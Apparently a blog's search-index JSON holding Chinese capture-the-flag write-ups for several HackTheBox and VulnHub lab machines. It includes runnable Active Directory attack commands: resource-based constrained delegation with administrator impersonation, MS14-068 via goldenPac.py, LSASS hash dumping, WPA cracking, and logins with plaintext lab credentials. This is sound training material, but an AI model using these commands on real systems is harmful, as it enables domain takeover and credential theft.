玩了半天终于玩儿明白了，原来人家回自动分析路径：\n这里建议使基于资源的约束型委派进行攻击，下面为必要工具的介绍：\nPowermad.ps1是一个专门拿来利用机器账户和DNS的漏洞利用工具，在基于资源的约束型委派中用来创建机器账户：\nhttps://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1\nPowerView.ps1是一个\nhttps://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1\nRubeus.exe是一个用于kerberos交互的工具：\n这个工具版本比较多，这里用的是https://github.com/r3motecontrol/Ghostpack-CompiledBinaries\n基于资源的约束型委派流程如下： 一、导入模块：\rImport-Module ./Powermad.ps1\r或者\r. ./Powermad.ps1\r二、添加机器账户，基于资源的约束型委派需要：\rSet-Variable -Name \u0026#34;FakePC\u0026#34; -Value \u0026#34;FAKE01\u0026#34; # FAKE01这个名字可以自己改\rSet-Variable -Name \u0026#34;targetComputer\u0026#34; -Value \u0026#34;DC\u0026#34;\rNew-MachineAccount -MachineAccount (Get-Variable -Name \u0026#34;FakePC\u0026#34;).Value -Password $(ConvertTo-SecureString \u0026#39;123456\u0026#39; -AsPlainText -Force) -Verbose\r三、设置权限\rSet-ADComputer (Get-Variable -Name \u0026#34;targetComputer\u0026#34;).Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name \u0026#34;FakePC\u0026#34;).Value + \u0026#39;$\u0026#39;)\r四、生成hash\r./Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb\r五、利用hash申请票据\r添加hosts文件\recho \u0026#34;10.10.11.174 support.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts\recho \u0026#34;10.10.11.174 dc.support.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts\r生成TGT票据，以administrator的身份申请一张访问http/dc.support.htb服务的票据\rpython3 getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B\r六、连接\r添加票据\rexport KRB5CCNAME=administrator.ccache\rsmbexec.py support.htb/administrator@dc.support.htb -no-pass -k 记得给sudo权限：\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x016-support/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5210351ecaab4ed72e1b4bf8ee75765d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEed69e887f32981ad919d9524cb6f0090%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003e没有开放HTTP协议，主要是通过域内渗透方式进行\u003c/p\u003e\n\u003cp\u003eSMB匿名登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbff327d0f4c284b632ee844164d0370b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE88308eb72b82e88e52dc73b8cbf33134%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这出现一个问题，不知到为啥，抓包看不到程序的发包\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb07edaf8d168cda964765ef93f596c6e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e主要考点：LDAP 轻量目录访问协议，理解上更像是一个树状图\u003c/p\u003e\n\u003cp\u003eldapsearch似乎-h与-p结合的使用方式被停用了？，帮助里面没看到这个用法，只能用-H了，\u003c/p\u003e\n\u003cp\u003e-x使用简单认证\u003c/p\u003e\n\u003cp\u003e-D用户名\u003c/p\u003e\n\u003cp\u003e-w密码\u003c/p\u003e\n\u003cp\u003e-W交互式输入密码\u003c/p\u003e\n\u003cp\u003e-b指定basedn查询，分辨名，唯一标识，根\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eldapsearch -H ldap://10.10.11.174 -D ldap@support.htb -w \u0026#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz\u0026#39; -b \u0026#34;dc=support,dc=htb\u0026#34; \u0026#34;*\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8fea50f5a65115346894cbd65d4dd4df%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现密码，这里可以使用crackmapexec进行探测，这是一个用户内网渗透的探测工具：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7907cef0313332cde4376717d6f59cec%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eevil-winrm工具是 Winrm 服务利用工具，需要合法用户身份信息，使用5985端口连接：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eevil-winrm -u support -p Ironside47pleasure40Watchful -i 10.10.11.174\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE58222552f72ea8805bbf63f007591aec%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查看flag\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEa8e93bca57d16f39f255af6e70fb5c09%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003eBloodHound是一款用于域分析的强大工具，它可以帮助安全专业人员识别和分析Active Directory（AD）环境中的攻击路径和权限问题。本文将介绍BloodHound的基本概念，并提供一些使用BloodHound进行域分析的编程实例。\u003c/p\u003e\n\u003cp\u003eBloodHound的使用：\u003c/p\u003e\n\u003cp\u003e启动：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e1、开启neo4j数据库：\r\nneo4j start\r\n访问本地的7474端口即可看到web页面，默认账密：neo4j，第一次使用需要修改密码\r\n2、kali启动BloodHound：\r\n./BloodHound --no-sandbox\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e离线脚本使用：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e1、上传windows版本的脚本，存放在以下路径：\r\nBloodHound-linux-x64/resources/app/Collectors\r\n2、运行即可\r\nSharpHound.exe -c all\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e玩了半天终于玩儿明白了，原来人家回自动分析路径：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5b4f95d646769f2b0e55d384e6720c30%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X016 Support"},{"content":"端口扫描 获取立足点 值得关注服务：ldap\\smb\\5985\nsmb存在匿名登录：\n这个文件夹好像是个人文件夹，这些文件名可能是用户名，接着看ldap，没有什么有效信息：\n使用刚刚smb获取到信息，进行用户名枚举：\n获得可用用户名三个：\n有了用户名可以尝试AS-REP：\n破解成功：\n#00^BlackKnight\nsupport\nwinrm登录失败：\nbloodhound.py看看吧：\n但是并没给出什么有用的信息：\npsexec也失败了：\nkerberoasting：\n再次查看bloodhound：\n我们可以修改AUDIT2020用户的密码：\n登录smb:\n发现关键内容lsass.zip\n读了一堆hash:\n提取出来吧：\n使用crackmapexec来爆破smb以获取可用hash:\nbloodhound可以知道，这是BACKUP OPERATORS组的：\n通过查找信息，发现以下解释：\n同时还是远程管理组的：\n登录后，利用BACKUP OPERATORS组的权限，来备份\n操作参考这个：\nhttps://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x017-blackfield/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEea18669927047071b2f016d741cd9f9cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEfc75e9ba6e8d681ccc511c28beec4352image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE4a7cc6b9b385446a255fed934430c98dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e值得关注服务：ldap\\smb\\5985\u003c/p\u003e\n\u003cp\u003esmb存在匿名登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc7ba8abad6771efef30f690f769ad499image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这个文件夹好像是个人文件夹，这些文件名可能是用户名，接着看ldap，没有什么有效信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8f53bc5134ba6e86cf716f47ea2c4d1bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用刚刚smb获取到信息，进行用户名枚举：\u003c/p\u003e\n\u003cp\u003e获得可用用户名三个：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEa9472104fb02cd43db957d2ff9e59bebimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有了用户名可以尝试AS-REP：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE436a68b5e9c5043a128f88a8f9c59a09image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e破解成功：\u003c/p\u003e\n\u003cp\u003e#00^BlackKnight\u003c/p\u003e\n\u003cp\u003esupport\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe8f7242a56316182305de35d369ef0f6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewinrm登录失败：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc578c613e35f8b16225d7e65422825e4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ebloodhound.py看看吧：\u003c/p\u003e\n\u003cp\u003e但是并没给出什么有用的信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE9e3a4f3918f84ebb4a7715cb6438436bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003epsexec也失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE44c2f715a9111c4b0ce67010f55c0f7bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ekerberoasting：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8ba0a51c180c93183dc8450b4f964333image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e再次查看bloodhound：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE87bd2e04203f2c43efbee1eb37d52375image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e我们可以修改AUDIT2020用户的密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE9917a62e8115593d051ae2621dd92d98image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e登录smb:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2c928d8e4b93bd01c9d900695b627a78image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现关键内容lsass.zip\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd13f868e7c7adfb3d7f02664f65ae955image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e读了一堆hash:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf3a02507e0161c2a105cf0f74dfa07f1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e提取出来吧：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE91e34b8a176e74c2a8b29e4d138fbb13image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用crackmapexec来爆破smb以获取可用hash:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7ef8dde872b3ece13cc9c59d6ee0738fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ebloodhound可以知道，这是BACKUP OPERATORS组的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE06bb8613fc5fb728047558ecb7567c99image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e通过查找信息，发现以下解释：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE7a04b590659e373eebf7fa1592ad9a1eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e同时还是远程管理组的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd305227fb19a6f99cf1090fe281feb4fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X017 blackfield"},{"content":"同样要修改IP地址：\n端口扫描 渗透 80端口：\n有joomla?，发现疑似账户名or密码，h@ck3rz!\naccess.txt，但是看起来没什么用：\n8080端口：\nfile.php，看起是想文件包含？，但是没有php解析环境\n8999端口，目录遍历，又是wordpress?，但是好像没有php解析环境：\n9000端口：\n后面还是看了WP，我是发现那个cap文件了的，也看到了802.11协议，但是没细想要去破解无线账号密码：\naircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap\nSSID为账号：\ndlink\np4ssword\n提权 非常简单\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x017-victim-1/","summary":"\u003cp\u003e同样要修改IP地址：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb12de8fd0af939ee2d9da7a68a39e8d5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3108ff06e2df581c14da45fcde7e0d11%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe0a2852908fe6b35bf9965c4f6ff2250%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e80端口：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc4c7e213ef2eefb9febc89f71c9a564a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有joomla?，发现疑似账户名or密码，h@ck3rz!\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE05d28b1ed75c579999e1f006f5a051b9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE787e9829b0e94f812afed574d08835ce%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eaccess.txt，但是看起来没什么用：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE32d255f6f924886490262bf49a047a6e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e8080端口：\u003c/p\u003e\n\u003cp\u003efile.php，看起是想文件包含？，但是没有php解析环境\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1deab00812c8a7d9fc7c908c7d6f9bc1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e8999端口，目录遍历，又是wordpress?，但是好像没有php解析环境：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe9b5d43e5c4bb786dc4a800759a0fe93%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e9000端口：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6c6fe22aa4f6390ba8ebc08e061051ca%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc75173120084a152588e61583d0b2672%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后面还是看了WP，我是发现那个cap文件了的，也看到了802.11协议，但是没细想要去破解无线账号密码：\u003c/p\u003e\n\u003cp\u003eaircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap\u003c/p\u003e\n\u003cp\u003eSSID为账号：\u003c/p\u003e\n\u003cp\u003edlink\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5c19b2950fa79ba144636f318f6230fc%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ep4ssword\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE081e4805e0cb9a15764d0cfe823c162c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e非常简单\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4d2dcd47522ad0c75ff05ff3ec43a48b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x017 Victim 1"},{"content":"该靶机开机可能遇到当前硬件版本不支持设备“sata”。的提示，修改兼容性即可\n好好好，搞了半天进不去grub，去vulnhub上看了一下，主机是静态IP，10.10.10.10，算了我改VM网段好伐\n端口扫描 渗透 可以发现是dpwwn02的家目录，但是没有写入权限，\nweb\nwpscan\n插件：\n用户名：\n存在任意文件读取，但是不是远程文件读取：\n后面再次看了一下nfs，给了sudo成功写入了文件，配合文件包含即可getshell\n提权 比较简单\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x018-dpwwn-2/","summary":"\u003cp\u003e该靶机开机可能遇到当前硬件版本不支持设备“sata”。的提示，修改兼容性即可\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5e8448c17e7dbc6f12d292a73b987dfe%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2c4e548f321bc7003e8021136ef5ac6e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e好好好，搞了半天进不去grub，去vulnhub上看了一下，主机是静态IP，10.10.10.10，算了我改VM网段好伐\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe4cbea163f3b93afa0c6463ca16f409e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb26dc0d1cc89188c2285171de1576623%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE201181ef39dab2bfdb67919c9e137c04%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e可以发现是dpwwn02的家目录，但是没有写入权限，\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfcf393a4901f21a9e7fddfcd89f340e5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eweb\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd30195d348e34f265adaf019d628abd4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewpscan\u003c/p\u003e\n\u003cp\u003e插件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb60bbfd4d88ae45387f31b37466db3fd%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户名：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE57e0f16b3786c2f84f40c34f292f6a4c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e存在任意文件读取，但是不是远程文件读取：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8e4d591203dca720b457726197741a9e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后面再次看了一下nfs，给了sudo成功写入了文件，配合文件包含即可getshell\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE685cd7686c5524ecfc7a7cb4a2feb216%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfea5a81fb7a15cdc7b3c294d53e16f2b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e比较简单\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa8767a10b626be9e072be731dfd560ab%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x018 dpwwn 2"},{"content":"端口扫描 获取立足点 值得关注的服务：smb\\ldap\\http\\mssql\nsmb\nldap\n看8080了：\n是两个xss：\n再看1377：\n打开是默认页面，目录扫描发现：\n管理员名为admin：\n文件名即为密码：\n那么这个密码，可能是web、sql、ldap的：\nweb不行\nldap没有账户，试试mssql先：\n成功了：\n这里几个思路：1、收集数据库里面的数据；2、中继\n中继出来，发现不让用：\n第二次进行尝试的时候发现：\nxp_cmd也不让用，只能看看敏感信息了：\n和user有关的表就三个，查起来很快：\njames J@m3s_P@ssW0rd!\n再次获得账户名密码，同样的，思路有几个，1、web；2、smb；3、ldap\nsmb看来没什么东西：\nweb也登录失败：\n只剩下ldap了，直接使用bloodhound来看看吧：\n这个用户是可以登录的，但是没有3389和5689开放啊：\n好像也没有什么好的线路了：\n根据目前的情况，无法登录，如果使用kerberoasting等方式也无法登录，那么只能想办法使用当前身份，直接获取到管理员的方式来获取权限：\nms14-068：\n通过rpc获取sid:\nimpacket:\npython ../impacket/examples/goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 htb.local/james:\u0026lsquo;J@m3s_P@ssW0rd!\u0026rsquo;@MANTIS.htb.local\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x018-matis/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE3d970b6a64ceb598de9c74b2f94023ceimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf0a3b62c138df63b319e3dff3916bca1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE1dbd01021a15c5e120cb0eb10a714b3cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e值得关注的服务：smb\\ldap\\http\\mssql\u003c/p\u003e\n\u003cp\u003esmb\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf38b5e691dd72fe96c35f2103d829abaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eldap\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8ab1d1ac0bda3c32a45f81e853ba38a7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看8080了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE1b155670fd396ef80562714c70a830adimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e是两个xss：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE81e7b16c4e1676a9e4102ce64f00e7fdimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e再看1377：\u003c/p\u003e\n\u003cp\u003e打开是默认页面，目录扫描发现：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE582bb4244a55f2c76bf1042a2e0800c2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e管理员名为admin：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd737440b28e8ed71794a1f53a1f9fa36image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e文件名即为密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEa8c8db80985487890c1077cb6b3b7b38image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEdc831e0ec4488d069f2d399e09da4b70image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e那么这个密码，可能是web、sql、ldap的：\u003c/p\u003e\n\u003cp\u003eweb不行\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE016642942a591e30ef1e0c7a56cb7fb3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eldap没有账户，试试mssql先：\u003c/p\u003e\n\u003cp\u003e成功了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE23c3f86220690713e83de14c2b2f1948image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里几个思路：1、收集数据库里面的数据；2、中继\u003c/p\u003e\n\u003cp\u003e中继出来，发现不让用：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf0c47c4eb493491ef0bcbe77fca1c980image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE169245b6c62c284503376520afca5e2dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e第二次进行尝试的时候发现：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" 